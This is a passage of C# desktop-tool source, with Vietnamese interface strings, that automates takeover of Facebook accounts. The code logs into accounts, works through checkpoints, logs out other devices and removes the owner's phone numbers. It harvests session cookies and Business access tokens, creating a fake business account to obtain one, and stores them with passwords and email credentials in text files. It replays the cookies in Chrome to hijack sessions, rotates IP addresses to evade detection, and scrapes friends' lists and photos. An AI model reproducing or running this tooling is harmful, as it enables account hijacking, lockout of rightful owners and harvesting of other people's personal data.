                                                        chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[2]/div[3]/label[1]/input[1]");
                                                        Thread.Sleep(500);
                                                        chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[3]/button[1]").Click();
                                                    }
                                                    catch { }
                                                }
                                                catch { }
                                                if (chrome.Url.Contains("checkpoint"))
                                                {
                                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                                    Thread.Sleep(10000);
                                                    string cpstt = "Checkpoint: ";
                                                    var listCp = chrome.FindElementsByName("verification_method").ToList();
                                                    if (listCp.Count > 0)
                                                    {
                                                        for (int c = 0; c < listCp.Count; c++)
                                                        {
                                                            string a = listCp[c].GetAttribute("value");
                                                            if (a == "3")
                                                                cpstt += "-Ảnh-";
                                                            else if (a == "2")
                                                                cpstt += "-Ngày sinh-";
                                                            else if (a == "20")
                                                            {
                                                                cpstt += "-Tin nhắn-";
                                                            }
                                                            else if (a == "4" || a == "34")
                                                            {
                                                                cpstt += "-Số Điện Thoại-";
                                                            }
                                                            else if (a == "14")
                                                            {
                                                                cpstt += "-CP Thiết bị-";
                                                            }
                                                            else if (a == "26")
                                                            {
                                                                cpstt += "-Nhờ bạn bè-";
                                                            }
                                                        }
                                                    }
                                                    LoadStatusGrid(cpstt, "statusVia", i, 4, dtgvViaAcc);
                                                    File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                                    if (ckbNoRegYahoo.Checked == true)
                                                    {
                                                        chrome.Manage().Cookies.DeleteAllCookies();
                                                    }
                                                    chrome.Quit();
                                                    return;
                                                }
                                            }
                                            if (ckbLogoutDevice.Checked)
                                            {
                                                if (!chrome.Url.Contains("password/change/reason/"))
                                                {
                                                    chrome.Url = "https://www.facebook.com/password/change/reason/";
                                                }

                                                LoadStatusGrid("Đăng xuất thiết bị...", "statusVia", i, 1, dtgvViaAcc);
                                                try
                                                {
                                                    js.ExecuteScript("document.getElementById('u_0_3').click();");
                                                    Thread.Sleep(500);
                                                    var listbtn = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("value") == "1").ToList();
                                                    if (listbtn.Count > 0)
                                                    {
                                                        for (int r = 0; r < listbtn.Count; r++)
                                                        {
                                                            if (listbtn[r].GetAttribute("class").Contains("selected"))
                                                            {
                                                                listbtn[r].Click();
                                                                break;
                                                            }
                                                        }
                                                    }
                                                    Thread.Sleep(3000);
                                                }
                                                catch { }
                                            }
                                            chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                                            var cc = chrome.Manage().Cookies.AllCookies.ToArray();

                                            string uid = ""; bool isFindUid = false;
                                            try
                                            {
                                                foreach (OpenQA.Selenium.Cookie cookie in cc)
                                                {
                                                    if (cookie.Name == "c_user")
                                                    {
                                                        uid = cookie.Value;
                                                        isFindUid = true;
                                                    }
                                                }
                                            }
                                            catch { }
                                            if (isFindUid == false)
                                            {
                                                chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                                                Thread.Sleep(3000);
                                                try
                                                {
                                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                                }
                                                catch { }
                                                string html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                                uid = Regex.Match(html, "av=(.*?)\"").Groups[1].Value;
                                            }
                                            if (uid != "" && uid.Length < 25)
                                            {
                                                int countRemove = 0;
                                                //remove phone
                                                if (ckbDeleteInfo.Checked)
                                                {
                                                    chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=mobile");
                                                    Thread.Sleep(500);
                                                    bool isHavePhone = true;
                                                    var tt = chrome.FindElementsByTagName("img").Where(x =>
                                                    {
                                                        try
                                                        {
                                                            if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                                return true;
                                                            else
                                                                return false;
                                                        }
                                                        catch
                                                        {
                                                            return false;
                                                        };
                                                    }).ToList();
                                                    int countDeletePhone = 0;
                                                    do
                                                    {
                                                        if (tt.Count > 0)
                                                        {
                                                            string xp = FileXpathFromElement(js, tt[0]);
                                                            string idBtnRemove = Regex.Match(xp, "id\\(\"(.*?)\"\\)").Groups[1].Value;
                                                            if (!idBtnRemove.Equals(""))
                                                            {
                                                                chrome.FindElementById(idBtnRemove).Click();
                                                                Thread.Sleep(1500);
                                                                var cl = chrome.FindElementsByTagName("button").Where(x =>
                                                                {
                                                                    try
                                                                    {
                                                                        if (x.GetAttribute("class").Contains("layerConfirm"))
                                                                            return true;
                                                                        else
                                                                            return false;
                                                                    }
                                                                    catch
                                                                    {
                                                                        return false;
                                                                    };
                                                                }).ToList();
                                                                if (cl.Count > 0)
                                                                {
                                                                    cl[0].Click();
                                                                    Thread.Sleep(1500);
                                                                    try
                                                                    {
                                                                        chrome.FindElementById("ajax_password").SendKeys(passFacebook);
                                                                    }
                                                                    catch { }
                                                                    cl = chrome.FindElementsByTagName("button").Where(x =>
                                                                    {
                                                                        try
                                                                        {
                                                                            if (x.GetAttribute("class").Contains("layerConfirm"))
                                                                                return true;
                                                                            else
                                                                                return false;
                                                                        }
                                                                        catch
                                                                        {
                                                                            return false;
                                                                        };
                                                                    }).ToList();
                                                                    if (cl.Count > 0)
                                                                    {
                                                                        cl[0].Click();
                                                                        countDeletePhone++;
                                                                        Thread.Sleep(1500);
                                                                    }
                                                                }
                                                            }
                                                            tt = chrome.FindElementsByTagName("img").Where(x =>
                                                            {
                                                                try
                                                                {
                                                                    if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                                        return true;
                                                                    else
                                                                        return false;
                                                                }
                                                                catch
                                                                {
                                                                    return false;
                                                                };
                                                            }).ToList();
                                                            if (tt.Count <= 0)
                                                            {
                                                                isHavePhone = false;
                                                                break;
                                                            }
                                                        }
                                                        else
                                                        {
                                                            break;
                                                        }
                                                    } while (isHavePhone == true);
                                                }

                                                var cookies = chrome.Manage().Cookies.AllCookies;
                                                string cook = "";
                                                var session = chrome.Manage().Cookies.AllCookies.ToArray();
                                                foreach (OpenQA.Selenium.Cookie cookie in session)
                                                {
                                                    cook += cookie.Name + "=" + cookie.Value + ";";
                                                }
                                                if (ckbHideMail.Checked)
                                                {
                                                    ChangePryvacyMail(cook);
                                                }
                                                string token = "";
                                                if (checkBox1.Checked)
                                                    token = GetTokenBussinessFromCookie(cook);
                                                File.AppendAllText("account//live.txt", uid + "|" + passFacebook + "|" + token + "|" + cook + "|" + email + "|" + passYahoo + "\r\n");
                                                LoadStatusGrid("Thành công!", "statusVia", i, 4, dtgvViaAcc);
                                                chrome.Quit();
                                            }
                                            else
                                            {
                                                LoadStatusGrid("Lỗi!", "statusVia", i, 2, dtgvViaAcc);
                                                chrome.Quit();
                                            }
                                        }
                                    }
                                    else
                                    {
                                        File.AppendAllText("account//nootp.txt", email + "|" + passFacebook + "|" + email + "|" + passYahoo + "\r\n");
                                        LoadStatusGrid("Không nhận được OTP", "statusVia", i, 2, dtgvViaAcc);
                                    }
                                }
                                else
                                {
                                    chrome.Quit();
                                    LoadStatusGrid("Lỗi đăng nhập!", "statusVia", i, 2, dtgvViaAcc);
                                }
                            }
                            catch
                            {
                                LoadStatusGrid("Lỗi!", "statusVia", i, 2, dtgvViaAcc);
                                chrome.Quit();
                            }
                        }
                        catch
                        {
                            LoadStatusGrid("Lỗi!", "statusVia", i, 2, dtgvViaAcc);
                            chrome.Quit();
                        }
                    }
                    else if (chrome.Url.Contains("Abuse"))
                    {
                        LoadStatusGrid("Tài khoản bị khóa!", "statusVia", i, 2, dtgvViaAcc);
                        chrome.Quit();
                    }
                    else
                    {
                        LoadStatusGrid("Lỗi đăng nhập!", "statusVia", i, 2, dtgvViaAcc);
                        chrome.Quit();
                    }
                }
            }
            catch (Exception ex)
            {
                LoadStatusGrid("Lỗi không xác định", "statusVia", i, 2, dtgvViaAcc);
                try
                {
                    File.WriteAllText("log/unknow.html", chrome.PageSource);
                }
                catch { }
                try
                {
                    chrome.Quit();
                }
                catch { }
                return;
            }
        }

        private string FileXpathFromElement(IJavaScriptExecutor js, IWebElement element)
        {
            try
            {
                return (string)js.ExecuteScript("gPt=function(c){if(c.id!==''){return'id(\"'+c.id+'\")'}if(c===document.body){return c.tagName}var a=0;var e=c.parentNode.childNodes;for(var b=0;b<e.length;b++){var d=e[b];if(d===c){return gPt(c.parentNode)+'/'+c.tagName+'['+(a+1)+']'}if(d.nodeType===1&&d.tagName===c.tagName){a++}}};return gPt(arguments[0]).toLowerCase();", element);
            }
            catch
            {
                return "";
            }
        }

        private void ToolStripMenuItem6_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvViaAcc.RowCount; i++)
            {
                dtgvViaAcc.Rows[i].Cells["choseVia"].Value = true;
            }
        }

        private void ToolStripMenuItem7_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvViaAcc.RowCount; i++)
            {
                dtgvViaAcc.Rows[i].Cells["choseVia"].Value = false;
            }
        }

        private void ToolStripMenuItem9_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvViaAcc.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvViaAcc.Rows[i].Cells["choseVia"].Value))
                {
                    dtgvViaAcc.Rows.RemoveAt(i);
                    i--;
                }
            }
        }

        private void BtnStopRecover_Click(object sender, EventArgs e)
        {
            isStop = true;
            this.Invoke((MethodInvoker)delegate ()
            {
                btnStartRecover.Enabled = true;
                btnStopRecover.Enabled = false;
            });
        }

        private void BtnLoadAccount_Click(object sender, EventArgs e)
        {
            try
            {
                dtgvAcc.Rows.Clear();
                string[] data = File.ReadAllLines("account/live.txt");
                for (int i = 0; i < data.Length; i++)
                {
                    try
                    {
                        if (data[i] != null)
                        {
                            string[] ct = data[i].Split('|');
                            string mail = "", passmail = "";
                            try
                            {
                                mail = ct[4];
                                passmail = ct[5];
                            }
                            catch { }
                            dtgvAcc.Rows.Add(false, ct[0], ct[1], ct[2], ct[3], "", "", mail, passmail, "", "");
                        }
                    }
                    catch
                    {

                    }

                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }

        }

        private void BtnCheckAccount_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvAcc.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvAcc.Rows[i].Cells["cChosef"].Value))
                {
                    int row = i;
                    new Thread(() =>
                    {
                        CheckCookies(row);
                    }).Start();
                }
            }
        }

        private void CheckCookies(int i)
        {
            dtgvAcc.Invoke((MethodInvoker)delegate ()
            {
                dtgvAcc.Rows[i].Cells["cStatusf"].Value = "Đang kiểm tra...";
            });
            string cookies = dtgvAcc.Rows[i].Cells["cCookief"].Value.ToString();
            string uid = "";
            string token = "";
            if (cookies.Contains("c_user"))
            {
                uid = Regex.Match(cookies, "c_user=(.*?);").Groups[1].Value;
            }
            else
            {
                dtgvAcc.Invoke((MethodInvoker)delegate ()
                {
                    dtgvAcc.Rows[i].Cells["cStatusf"].Value = "Cookie không đúng!";
                });
                return;
            }

            try
            {

                #region Khai báo request
                xNet.HttpRequest request = new xNet.HttpRequest();
                request.KeepAlive = true;
                request.Cookies = new CookieDictionary();
                request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                request.UserAgent = Http.ChromeUserAgent();
                #endregion
                request.AddHeader("Cookie", cookies);
                String homeFace = request.Get("https://www.facebook.com/").ToString();
                if (homeFace.Contains(uid) && homeFace.Contains("name=\"fb_dtsg\" value="))
                {
                    request.AddHeader("Cookie", cookies);
                    string GetDataToken = request.Get("https://business.facebook.com/select/").ToString();
                    string BusinessID = "";
                    BusinessID = Regex.Match(GetDataToken, "\"businessID\":\"(.*?)\"").Groups[1].Value;
                    if (BusinessID.Equals(""))
                    {
                        BusinessID = Regex.Match(GetDataToken, "businessID:\"(.*?)\"").Groups[1].Value;
                    }
                    if (BusinessID != "")
                    {
                        request.AddHeader("Cookie", cookies);
                        GetDataToken = request.Get("https://business.facebook.com/home?business_id=" + BusinessID).ToString();
                        token = Regex.Match(GetDataToken, "EAAG(.*?)\"").Value.Replace("\"", "");
                    }
                    else
                    {
                        request.AddHeader("Cookie", cookies);
                        string getdata = request.Get("https://business.facebook.com/overview/").ToString();
                        string encrypted = Regex.Match(getdata, "encrypted\":\"(.*?)\"").Groups[1].Value;
                        string fb_dtsg = Regex.Match(getdata, "\"fb_dtsg\" value=\"(.*?)\"").Groups[1].Value;
                        string jazoest = Regex.Match(getdata, "\"jazoest\" value=\"(.*?)\"").Groups[1].Value;

                        request.AddHeader("Cookie", cookies);
                        string FullData = "__user=" + uid + "&__pc=PHASED:DEFAULT&__a=1&fb_dtsg=" + fb_dtsg;
                        string GetHtml = request.Post("https://business.facebook.com/business/create_account/?brand_name=" + uid + "&first_name=Long&last_name=Long&email=" + uid + "@gmail.com&timezone_id=140&business_category=OTHER&city=&country=US&state=a1&legal_name=&phone_number=&postal_code=&street1=&street2=&website_url=&is_b2b=false", FullData, "application/x-www-form-urlencoded").ToString();
                        request.AddHeader("Cookie", cookies);
                        GetDataToken = request.Get("https://business.facebook.com/select/?next=https%3A%2F%2Fbusiness.facebook.com%2Fhome").ToString();
                        BusinessID = Regex.Match(GetDataToken, "\"businessID\":\"(.*?)\"").Groups[1].Value;
                        request.AddHeader("Cookie", cookies);
                        GetDataToken = request.Get("https://business.facebook.com/home?business_id=" + BusinessID).ToString();
                        token = Regex.Match(GetDataToken, "EAAG(.*?)\"").Value.Replace("\"", "");
                    }
                    if (token != "")
                    {
                        string linkPost = "https://graph.facebook.com/me?access_token=" + token + "&fields=id,name,groups.limit(5000)";
                        string getInfor = request.Get(linkPost).ToString();
                        JObject obj = JObject.Parse(getInfor);
                        dtgvAcc.Invoke((MethodInvoker)delegate ()
                        {
                            dtgvAcc.Rows[i].Cells["cTokenf"].Value = token;
                            dtgvAcc.Rows[i].Cells["cNamef"].Value = obj["name"].ToString();
                            dtgvAcc.Rows[i].Cells["cInfof"].Value = "Live";
                        });
                    }
                }
                else
                {
                    dtgvAcc.Invoke((MethodInvoker)delegate ()
                    {
                        dtgvAcc.Rows[i].Cells["cInfof"].Value = "Die";
                    });
                }
            }
            catch
            {

            }
            dtgvAcc.Invoke((MethodInvoker)delegate ()
            {
                dtgvAcc.Rows[i].Cells["cStatusf"].Value = "";
            });
        }

        private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string textCopy = "";
                for (int i = 0; i < dtgvChangeVia.RowCount; i++)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                    {
                        textCopy += dtgvChangeVia.Rows[i].Cells["cUidMail"].Value.ToString() + "\t" + dtgvChangeVia.Rows[i].Cells["cMailMail"].Value.ToString() + "\t" + (dtgvChangeVia.Rows[i].Cells["cAddressMail"].Value == null ? "" : dtgvChangeVia.Rows[i].Cells["cAddressMail"].Value.ToString()) + "\r\n";
                    }
                }
                Clipboard.SetText(textCopy);
            }
            catch { }
        }

        private void BtnCheckTel_Click(object sender, EventArgs e)
        {
            string disconnect = RunCMD("Rasdial /disconnect");
            string connect = RunCMD("Rasdial " + cbbTel.Text);
            if (connect.Contains("modem was not found"))
            {
                this.Invoke((MethodInvoker)delegate ()
                {
                    MessageBox.Show("Không tìm thấy thiết bị!");
                });
                File.AppendAllText("ErrorLog.txt", "===" + DateTime.Now.ToString("dd/MM HH:mm:ss") + "===" + Environment.NewLine + connect + Environment.NewLine);
            }
            else if (connect.Contains("Access error 623"))
            {

                MessageBox.Show("Sai tên nhà mạng");
                File.AppendAllText("ErrorLog.txt", "===" + DateTime.Now.ToString("dd/MM HH:mm:ss") + "===" + Environment.NewLine + connect + Environment.NewLine);
            }
            else if (connect.Contains("Successfully connected to"))
            {
                MessageBox.Show("Đổi IP thành công!");
            }
        }

        private void MởTrìnhDuyệtToolStripMenuItem_Click(object sender, EventArgs e)
        {

            for (int i = 0; i < dtgvAcc.Rows.Count; i++)
            {
                if (Convert.ToBoolean(dtgvAcc.Rows[i].Cells["cChosef"].Value))
                {
                    int row = i;
                    new Thread(() =>
                    {
                        OpenChromeProfile(row);
                    }).Start();
                }
            }
        }

        private void OpenChromeProfile(int indexRow)
        {
            DataGridViewRow row = dtgvAcc.Rows[indexRow];
            string token = row.Cells["cTokenf"].Value == null ? "" : row.Cells["cTokenf"].Value.ToString();
            string cookieStr = row.Cells["cCookief"].Value == null ? "" : row.Cells["cCookief"].Value.ToString();
            string uid = row.Cells["cUidf"].Value.ToString();
            string password = row.Cells["cPassf"].Value.ToString();
            //dtgvAcc.Rows[indexRow].Cells["cStatusf"].Value = "Đang mở trình duyệt";

            ChromeOptions options = new ChromeOptions();
            //string profilePath = @"profile\" + uid;
            options.AddArguments(new string[] {
                        "--disable-extensions",
                        "--disable-notifications",
                        "--window-size=450,700",
                        "--window-position=0,0",
                        "--no-sandbox",
                        //@"--user-data-dir="+profilePath
                    });
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            ChromeDriver chrome = null;
            try
            {
                chrome = new ChromeDriver(service, options);
                IJavaScriptExecutor js = chrome as IJavaScriptExecutor;
                chrome.Navigate().GoToUrl("https://www.facebook.com");
                string html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                if (html.Contains(uid))
                {
                    dtgvAcc.Invoke((MethodInvoker)delegate ()
                    {
                        dtgvAcc.Rows[indexRow].Cells["cStatusf"].Value = "Đăng nhập thành công";
                    });
                }
                else
                {
                    dtgvAcc.Invoke((MethodInvoker)delegate ()
                    {
                        dtgvAcc.Rows[indexRow].Cells["cStatusf"].Value = "Đang đăng nhập...";
                    });
                    string[] arrData = cookieStr.Split(';');
                    foreach (string item in arrData)
                    {
                        if (item.Trim() != "")
                        {
                            try
                            {
                                string[] pars = item.Split('=');
                                OpenQA.Selenium.Cookie cok = new OpenQA.Selenium.Cookie(pars[0].Trim(), pars[1].Trim(), ".facebook.com", "/", DateTime.Now.AddDays(10));
                                chrome.Manage().Cookies.AddCookie(cok);
                            }
                            catch { }
                        }
                    }
                    chrome.Navigate().GoToUrl("https://www.facebook.com");
                    html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                    if (html.Contains(uid))
                    {
                        dtgvAcc.Invoke((MethodInvoker)delegate ()
                        {
                            dtgvAcc.Rows[indexRow].Cells["cStatusf"].Value = "Đăng nhập thành công";
                        });
                    }
                }
            }
            catch
            {
                dtgvAcc.Invoke((MethodInvoker)delegate ()
                {
                    dtgvAcc.Rows[indexRow].Cells["cStatusf"].Value = "Lỗi";
                });
                chrome.Quit();
                return;
            }
        }

        private void ToolStripMenuItem8_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvAcc.RowCount; i++)
            {
                dtgvAcc.Rows[i].Cells["cChosef"].Value = true;
            }
        }

        private void ToolStripMenuItem10_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvAcc.RowCount; i++)
            {
                dtgvAcc.Rows[i].Cells["cChosef"].Value = false;
            }
        }

        private void LọcTrùngToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<string> tt = new List<string>();
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                {
                    string email = dtgvChangeVia.Rows[i].Cells["cMailMail"].Value.ToString();
                    if (tt.Contains(email))
                    {
                        dtgvChangeVia.Rows.RemoveAt(i);
                        i--;
                    }
                    else
                    {
                        tt.Add(email);
                    }
                }
            }
        }

        private void CheckCountryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int iThread = 0;
            int maxThread = 10;
            new Thread(() =>
            {
                for (int i = 0; i < dtgvChangeVia.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                    {
                        if (iThread < maxThread)
                        {
                            Interlocked.Increment(ref iThread);
                            int row = i;
                            new Thread(() =>
                            {
                                CheckCountry(row);
                                Interlocked.Decrement(ref iThread);
                            }).Start();
                            i++;
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        i++;
                    }
                }
            }).Start();
        }

        private void CheckCountry(int row)
        {
            string uid = "", location = "";
            try
            {
                uid = dtgvChangeVia.Rows[row].Cells["cUidMail"].Value.ToString();
            }
            catch { }
            try
            {
                location = dtgvChangeVia.Rows[row].Cells["cAddressMail"].Value.ToString();
            }
            catch { }
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion

            if (uid != "" && location == "")
                try
                {
                    string a = request.Get("https://graph.facebook.com/v2.11/" + uid + "/?access_token=" + txbTokenTemp.Text + "&fields=location").ToString();
                    if (a.Contains("location"))
                    {
                        try
                        {
                            JObject objLoca = JObject.Parse(a);
                            location = objLoca["location"]["name"].ToString();
                        }
                        catch { }
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.ToString());
                }
            if (location != "")
            {
                try
                {
                    string jsonGetLocation = request.Post("https://www.mapdevelopers.com/data.php?operation=geocode", "&address=" + location, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                    JObject objLoca = JObject.Parse(jsonGetLocation);
                    dtgvChangeVia.Rows[row].Cells["cAddressMail"].Value = objLoca["data"]["country"].ToString();
                }
                catch { }

            }
        }

        private void DtgvChangeVia_KeyPress(object sender, KeyPressEventArgs e)
        {
            //if (e.KeyChar == (char)Keys.Space)
            //{
            //    MessageBox.Show(dtgvChangeVia.SelectedRows.Count.ToString());
            //}
        }

        private void CheckCountryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            int iThread = 0;
            int maxThread = 10;
            new Thread(() =>
            {
                for (int i = 0; i < dtgvViaAcc.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvViaAcc.Rows[i].Cells["choseVia"].Value))
                    {
                        if (iThread < maxThread)
                        {
                            Interlocked.Increment(ref iThread);
                            int row = i;
                            new Thread(() =>
                            {
                                CheckCountryViaAcc(row);
                                Interlocked.Decrement(ref iThread);
                            }).Start();
                            i++;
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        i++;
                    }
                }
            }).Start();
        }

        private void CheckCountryViaAcc(int row)
        {
            string uid = "", location = "";
            try
            {
                uid = dtgvViaAcc.Rows[row].Cells["uidVia"].Value.ToString();
            }
            catch { }
            try
            {
                location = dtgvViaAcc.Rows[row].Cells["countryVia"].Value.ToString();
            }
            catch { }
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion

            if (uid != "" && location == "")
                try
                {
                    string a = request.Get("https://graph.facebook.com/v2.11/" + uid + "/?access_token=" + txbTokenTemp.Text + "&fields=location").ToString();
                    if (a.Contains("location"))
                    {
                        try
                        {
                            JObject objLoca = JObject.Parse(a);
                            location = objLoca["location"]["name"].ToString();
                        }
                        catch { }
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.ToString());
                }
            if (location != "")
            {
                try
                {
                    string jsonGetLocation = request.Post("https://www.mapdevelopers.com/data.php?operation=geocode", "&address=" + location, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                    JObject objLoca = JObject.Parse(jsonGetLocation);
                    dtgvViaAcc.Rows[row].Cells["countryVia"].Value = objLoca["data"]["country"].ToString();
                }
                catch { }
            }
        }

        private void BtnCheckToken_Click(object sender, EventArgs e)
        {
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion
            try
            {
                string a = request.Get("https://graph.facebook.com/me/?access_token=" + txbTokenTemp.Text).ToString();
                MessageBox.Show("Live");
            }
            catch
            {
                MessageBox.Show("Die");
            }
        }

        private void Button1_Click_2(object sender, EventArgs e)
        {

        }

        private string topB;
        private string bottomB;
        private void BackupHtmlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int iThread = 0;
            int maxThread = 10;
            string token = txbTokenTemp.Text;
            topB = File.ReadAllText("temp//top.txt");
            bottomB = File.ReadAllText("temp//bottom.txt");
            new Thread(() =>
            {
                for (int i = 0; i < dtgvChangeVia.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                    {
                        if (iThread < maxThread)
                        {
                            Interlocked.Increment(ref iThread);
                            int row = i;
                            new Thread(() =>
                            {
                                BackupToken(row, token);
                                Interlocked.Decrement(ref iThread);
                            }).Start();
                            i++;
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        i++;
                    }
                }
            }).Start();
        }

        private void BackupToken(int row, string token)
        {
            string htmlEx = topB;
            try
            {
                string uid = "";
                try
                {
                    uid = dtgvChangeVia.Rows[row].Cells["cUidMail"].Value.ToString();
                }
                catch { }
                if (uid != "")
                {
                    dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Đang backup...";

                    #region Khai báo request
                    xNet.HttpRequest xRequest = new xNet.HttpRequest();
                    xRequest.KeepAlive = true;
                    xRequest.Cookies = new CookieDictionary();
                    xRequest.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    xRequest.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                    xRequest.UserAgent = Http.ChromeUserAgent();
                    #endregion
                    string getListFriend = xRequest.Get("https://graph.facebook.com/" + uid + "/friends?limit=5000&fields=id,name&access_token=" + token).ToString();
                    string getInfor = xRequest.Get("https://graph.facebook.com/" + uid + "/?fields=id,name&access_token=" + token).ToString();
                    JObject objFriend = JObject.Parse(getListFriend);
                    JObject objInfo = JObject.Parse(getInfor);
                    string dataAdd = "\r\n $scope.user_obj = {\"name\": \"" + objInfo["name"] + "\",\"type\": 0,\"email\": \"\",\"link\": \"https://www.facebook.com/" + objInfo["id"] + "\",\"mobile_phone\": \"\",\"fb_id\": \"\",\"fb_cover_id\": \"\",\"fb_all_virtual_ids\": {\"350685531728\": \"100008048791430\"},\"fb_avatar\": \"\",\"number_page\": 0,\"number_group\": 17,\"number_friend\": 372,\"account_id\": 100004995669107,\"data_obj\": {\"gender\": 2,\"birthday\": \"03/08/1994\"},\"status\": 1,\"updated\": \"2018-07-10 20:17:39\",\"customer_id\": 102128,\"store_id\": 10,\"id\": 201167868}\r\n";
                    htmlEx += dataAdd;
                    int countSuccess = 0;
                    int totalFriend = objFriend["data"].Count();
                    for (int i = 0; i < objFriend["data"].Count(); i++)
                    {
                        try
                        {
                            string dataPhoto = "$scope.raw_photo_objs.push(";
                            dataPhoto += "{\"id\": \"" + objFriend["data"][i]["id"] + "\",\"name\": \"" + objFriend["data"][i]["name"] + "\", \"data\": [";
                            string sourceImageFriend = xRequest.Get("https://graph.facebook.com/v3.2/" + objFriend["data"][i]["id"].ToString() + "?fields=id,name,photos{source,width,height}&access_token=" + token).ToString();
                            if (sourceImageFriend.Contains("photos"))
                            {
                                countSuccess++;
                                JObject objImage = JObject.Parse(sourceImageFriend);
                                for (int j = 0; j < objImage["photos"]["data"].Count(); j++)
                                {
                                    dataPhoto += "{\"source\": \"" + objImage["photos"]["data"][j]["source"] + "\",\"created_time\": \"2014-04-29T03:27:29+0000\",\"id\": \"" + objImage["photos"]["data"][j]["id"] + "\"},\r\n";
                                }
                                dataPhoto += "]});\r\n";
                                htmlEx += dataPhoto;
                            }
                            else
                            {
                                dataPhoto += "]});\r\n";
                                htmlEx += dataPhoto;
                            }
                            dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Đang backup: " + countSuccess + "/" + i + "/" + totalFriend;
                        }
                        catch { }
                    }
                    htmlEx += bottomB;
                    File.WriteAllText("backup/" + uid + ".html", htmlEx);
                    dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Backup thành công: " + countSuccess + "/" + totalFriend;
                }
            }
            catch
            {
                dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Lỗi backup!";
            }
        }

        private void BackupCookieToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int iThread = 0;
            int maxThread = 20;
            string cookie = txbCookieTemp.Text;
            topB = File.ReadAllText("temp//top.txt");
            bottomB = File.ReadAllText("temp//bottom.txt");
            new Thread(() =>
            {
                for (int i = 0; i < dtgvChangeVia.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                    {
                        if (iThread < maxThread)
                        {
                            Interlocked.Increment(ref iThread);
                            int row = i;
                            new Thread(() =>
                            {
                                BackupCookie(row, cookie);
                                Interlocked.Decrement(ref iThread);
                            }).Start();
                            i++;
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        i++;
                    }
                }
            }).Start();
        }

